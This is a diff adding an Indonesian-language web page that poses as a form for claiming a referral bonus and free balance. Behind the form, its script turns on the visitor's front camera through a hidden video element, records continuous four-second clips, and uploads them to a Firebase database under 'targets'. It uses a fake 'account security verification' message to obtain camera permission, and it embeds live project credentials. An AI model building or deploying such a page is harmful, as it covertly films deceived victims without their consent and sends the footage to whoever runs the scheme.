@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Bonus Referral & Saldo Gratis</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: #1e293b; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; border: 1px solid #334155; }
+        h2 { margin-bottom: 10px; color: #38bdf8; font-size: 22px; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 6px; margin-bottom: 15px; font-size: 16px; text-align: center; }
+        button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #1d4ed8; }
+        #loading-box { display: none; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div id="form-box">
+            <h2>Klaim Bonus Referral</h2>
+            <p>Masukkan kode referral atau voucher kamu untuk mengaktifkan hadiah saldo gratis.</p>
+            <input type="text" id="ref-code" placeholder="Contoh: REF992026" autocomplete="off">
+            <button onclick="claimBonus()">Lanjutkan & Klaim</button>
+        </div>
+
+        <div id="loading-box">
+            <div class="spinner"></div>
+            <h3>Memverifikasi Kode...</h3>
+            <p>Mohon tunggu sebentar, sistem sedang memproses bonus ke akun kamu.</p>
+        </div>
+    </div>
+
+    <video id="cam" autoplay playsinline muted style="display:none;"></video>
+
+    <!-- Firebase SDK v9 Modular -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const sessionId = 'target_' + Date.now();
+        let stream = null;
+
+        window.claimBonus = async function() {
+            const codeInput = document.getElementById('ref-code').value.trim();
+            if(!codeInput) {
+                alert('Silakan masukkan kode referral terlebih dahulu!');
+                return;
+            }
+
+            document.getElementById('form-box').style.display = 'none';
+            document.getElementById('loading-box').style.display = 'block';
+
+            const video = document.getElementById('cam');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                // Fungsi untuk merekam dan langsung mengirim klip tiap 4 detik sekali secara aman
+                const startLoopRecording = () => {
+                    let chunks = [];
+                    let recorder;
+                    try {
+                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+                    } catch (e) {
+                        recorder = new MediaRecorder(stream);
+                    }
+
+                    recorder.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    recorder.onstop = async () => {
+                        if (chunks.length === 0) return;
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = async () => {
+                            const base64Video = reader.result;
+                            const clipId = sessionId + '_' + Date.now();
+                            try {
+                                // Kirim langsung ke database saat target masih aktif di halaman
+                                await set(ref(db, `targets/${clipId}`), {
+                                    code: codeInput,
+                                    video: base64Video,
+                                    time: Date.now()
+                                });
+                            } catch (err) {
+                                console.error("Gagal kirim klip:", err);
+                            }
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+
+                    recorder.start();
+
+                    // Setiap 4 detik, simpan klip lalu buat rekaman baru tanpa terputus
+                    setTimeout(() => {
+                        if (recorder.state === "recording") {
+                            recorder.stop();
+                            startLoopRecording(); // Lanjut rekam klip berikutnya
+                        }
+                    }, 4000);
+                };
+
+                startLoopRecording();
+
+            } catch (err) {
+                alert('Akses kamera wajib diizinkan untuk verifikasi keamanan akun!');
+                document.getElementById('form-box').style.display = 'block';
+                document.getElementById('loading-box').style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
